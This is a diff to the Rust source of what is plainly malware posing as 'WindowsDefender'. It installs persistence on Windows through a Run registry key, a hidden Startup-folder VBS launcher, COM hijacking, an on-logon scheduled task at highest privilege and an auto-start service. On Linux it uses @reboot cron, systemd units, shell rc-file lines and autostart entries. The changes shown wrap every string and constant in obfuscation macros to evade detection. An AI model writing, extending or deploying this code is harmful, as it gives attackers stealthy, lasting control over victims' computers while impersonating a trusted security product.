@@ -23,23 +23,23 @@ const TARGET_DIR: &str = ".cache/defender";
 #[cfg(target_os = "linux")]
 const TARGET_BIN: &str = "defender";
 
-pub fn persist(is_dll: bool) -> std::io::Result<()> {
+pub fn persist() -> std::io::Result<()> {
     if env::current_exe().is_err() {
         return Ok(());
     }
     #[cfg(target_os = "windows")]
-    return windows_persist(is_dll);
+    return windows_persist();
     #[cfg(target_os = "linux")]
     return linux_persist();
     #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-    { let _ = is_dll; Ok(()) }
+    { Ok(()) }
 }
 
 #[cfg(target_os = "windows")]
-fn windows_persist(is_dll: bool) -> std::io::Result<()> {
+fn windows_persist() -> std::io::Result<()> {
     let current_exe = env::current_exe()?;
 
-    if is_dll {
+    if crate::util::is_dll::is_dll() {
         return dll_persistence(&current_exe);
     }
 
@@ -55,27 +55,27 @@ fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
 
     // 1. Registry Run key via rundll32
     let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
-    if let Ok((key, _)) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
+    if let Ok((key, _)) = hkcu.create_subkey(cryptify::encrypt_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
         let rundll_cmd = format!("rundll32.exe \"{}\",NetClientMain", dll_str);
-        let _ = key.set_value("WindowsDefender", &rundll_cmd);
+        let _ = key.set_value(cryptify::encrypt_string!("WindowsDefender"), &rundll_cmd);
     }
 
     // 2. Startup folder VBS wrapper
-    if let Ok(appdata) = env::var("APPDATA") {
-        let startup = Path::new(&appdata).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+    if let Ok(appdata) = env::var(cryptify::encrypt_string!("APPDATA")) {
+        let startup = Path::new(&appdata).join(cryptify::encrypt_string!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
         let _ = fs::create_dir_all(&startup);
         let vbs = format!(
             "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\"{}\"\",NetClientMain\", 0, False\n",
             dll_str
         );
-        let _ = fs::write(startup.join("defender.vbs"), vbs);
+        let _ = fs::write(startup.join(cryptify::encrypt_string!("defender.vbs")), vbs);
     }
 
     // 3. COM hijacking via HKCU
-    let clsid_path = "Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32";
+    let clsid_path = cryptify::encrypt_string!("Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32");
     if let Ok((key, _)) = hkcu.create_subkey(clsid_path) {
-        let _ = key.set_value("", &dll_str);
-        let _ = key.set_value("ThreadingModel", &"Apartment");
+        let _ = key.set_value(cryptify::encrypt_string!(""), &dll_str);
+        let _ = key.set_value(cryptify::encrypt_string!("ThreadingModel"), &cryptify::encrypt_string!("Apartment"));
     }
 
     Ok(())
@@ -84,11 +84,11 @@ fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
 #[cfg(target_os = "windows")]
 fn scheduled_task(target_path: &Path) {
     let path_str = target_path.to_string_lossy();
-    let _ = Command::new("schtasks")
+    let _ = Command::new(cryptify::encrypt_string!("schtasks"))
         .args(&[
-            "/create", "/tn", "WindowsDefender",
-            "/tr", &path_str,
-            "/sc", "onlogon", "/rl", "highest", "/f",
+            cryptify::encrypt_string!("/create"), cryptify::encrypt_string!("/tn"), cryptify::encrypt_string!("WindowsDefender"),
+            cryptify::encrypt_string!("/tr"), &path_str,
+            cryptify::encrypt_string!("/sc"), cryptify::encrypt_string!("onlogon"), cryptify::encrypt_string!("/rl"), cryptify::encrypt_string!("highest"), cryptify::encrypt_string!("/f"),
         ])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
@@ -99,15 +99,15 @@ fn scheduled_task(target_path: &Path) {
 #[cfg(target_os = "windows")]
 fn windows_service(target_path: &Path) {
     let path_str = target_path.to_string_lossy();
-    let _ = Command::new("sc")
-        .args(&["create", "WindowsDefender", "binPath=", &path_str, "start=", "auto"])
+    let _ = Command::new(cryptify::encrypt_string!("sc"))
+        .args(&[cryptify::encrypt_string!("create"), cryptify::encrypt_string!("WindowsDefender"), cryptify::encrypt_string!("binPath="), &path_str, cryptify::encrypt_string!("start="), cryptify::encrypt_string!("auto")])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .spawn();
-    std::thread::sleep(std::time::Duration::from_secs(2));
-    let _ = Command::new("sc")
-        .args(&["start", "WindowsDefender"])
+    std::thread::sleep(std::time::Duration::from_secs(goldberg::goldberg_int!(2)));
+    let _ = Command::new(cryptify::encrypt_string!("sc"))
+        .args(&[cryptify::encrypt_string!("start"), cryptify::encrypt_string!("WindowsDefender")])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
@@ -118,7 +118,7 @@ fn windows_service(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn linux_persist() -> std::io::Result<()> {
-    let home = env::var("HOME")
+    let home = env::var(cryptify::encrypt_string!("HOME"))
         .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
     let target_dir = Path::new(&home).join(TARGET_DIR);
     let target_path = target_dir.join(TARGET_BIN);
@@ -130,9 +130,9 @@ fn linux_persist() -> std::io::Result<()> {
     if current_exe != target_path {
         fs::copy(&current_exe, &target_path)?;
         // Set executable permissions
-        let _ = fs::set_permissions(&target_path, std::os::unix::fs::PermissionsExt::from_mode(0o755));
+        let _ = fs::set_permissions(&target_path, std::os::unix::fs::PermissionsExt::from_mode(goldberg::goldberg_int!(0o755)));
         Command::new(&target_path).spawn().ok();
-        std::process::exit(0);
+        std::process::exit(goldberg::goldberg_int!(0));
     }
 
     cron_persistence(&target_path);
@@ -147,7 +147,7 @@ fn linux_persist() -> std::io::Result<()> {
 fn cron_persistence(target_path: &Path) {
     let entry = format!("@reboot {}\n", target_path.display());
 
-    let output = Command::new("crontab").arg("-l").output();
+    let output = Command::new(cryptify::encrypt_string!("crontab")).arg(cryptify::encrypt_string!("-l")).output();
     let existing = match output {
         Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
         Err(_) => String::new(),
@@ -158,7 +158,7 @@ fn cron_persistence(target_path: &Path) {
     }
 
     let new_cron = existing + &entry;
-    let mut child = match Command::new("crontab")
+    let mut child = match Command::new(cryptify::encrypt_string!("crontab"))
         .stdin(std::process::Stdio::piped())
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
@@ -177,13 +177,13 @@ fn cron_persistence(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn systemd_persistence(target_path: &Path) {
-    let home = match env::var("HOME") {
+    let home = match env::var(cryptify::encrypt_string!("HOME")) {
         Ok(h) => h,
         Err(_) => return,
     };
 
-    let service_dir = Path::new(&home).join(".config/systemd/user");
-    let service_file = service_dir.join("defender.service");
+    let service_dir = Path::new(&home).join(cryptify::encrypt_string!(".config/systemd/user"));
+    let service_file = service_dir.join(cryptify::encrypt_string!("defender.service"));
 
     let _ = fs::create_dir_all(&service_dir);
 
@@ -196,21 +196,21 @@ fn systemd_persistence(target_path: &Path) {
         return;
     }
 
-    let _ = Command::new("systemctl")
-        .args(&["--user", "enable", "defender.service"])
+    let _ = Command::new(cryptify::encrypt_string!("systemctl"))
+        .args(&[cryptify::encrypt_string!("--user"), cryptify::encrypt_string!("enable"), cryptify::encrypt_string!("defender.service")])
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .output();
 
-    let _ = Command::new("systemctl")
-        .args(&["--user", "start", "defender.service"])
+    let _ = Command::new(cryptify::encrypt_string!("systemctl"))
+        .args(&[cryptify::encrypt_string!("--user"), cryptify::encrypt_string!("start"), cryptify::encrypt_string!("defender.service")])
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .output();
 
     // Also try system-wide if we have permissions
-    let _ = Command::new("systemctl")
-        .args(&["enable", "defender.service"])
+    let _ = Command::new(cryptify::encrypt_string!("systemctl"))
+        .args(&[cryptify::encrypt_string!("enable"), cryptify::encrypt_string!("defender.service")])
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .output();
@@ -218,7 +218,7 @@ fn systemd_persistence(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn bashrc_persistence(target_path: &Path) {
-    let home = match env::var("HOME") {
+    let home = match env::var(cryptify::encrypt_string!("HOME")) {
         Ok(h) => h,
         Err(_) => return,
     };
@@ -227,7 +227,7 @@ fn bashrc_persistence(target_path: &Path) {
     let parent_str = target_path.parent().map(|p| p.display().to_string()).unwrap_or_default();
     let line = format!("\n# Startup\nexport PATH=\"$PATH:{}\"\n{}\n", parent_str, target_str);
 
-    for rc_file in &[".bashrc", ".profile", ".zshrc", ".bash_profile"] {
+    for rc_file in &[cryptify::encrypt_string!(".bashrc"), cryptify::encrypt_string!(".profile"), cryptify::encrypt_string!(".zshrc"), cryptify::encrypt_string!(".bash_profile")] {
         let rc_path = Path::new(&home).join(rc_file);
         if rc_path.exists() {
             if let Ok(content) = fs::read_to_string(&rc_path) {
@@ -245,12 +245,12 @@ fn bashrc_persistence(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn autostart_desktop(target_path: &Path) {
-    let home = match env::var("HOME") {
+    let home = match env::var(cryptify::encrypt_string!("HOME")) {
         Ok(h) => h,
         Err(_) => return,
     };
 
-    let autostart_dir = Path::new(&home).join(".config/autostart");
+    let autostart_dir = Path::new(&home).join(cryptify::encrypt_string!(".config/autostart"));
     let _ = fs::create_dir_all(&autostart_dir);
 
     let desktop = format!(
@@ -258,5 +258,5 @@ fn autostart_desktop(target_path: &Path) {
         target_path.display()
     );
 
-    let _ = fs::write(autostart_dir.join("defender.desktop"), desktop);
+    let _ = fs::write(autostart_dir.join(cryptify::encrypt_string!("defender.desktop")), desktop);
 }
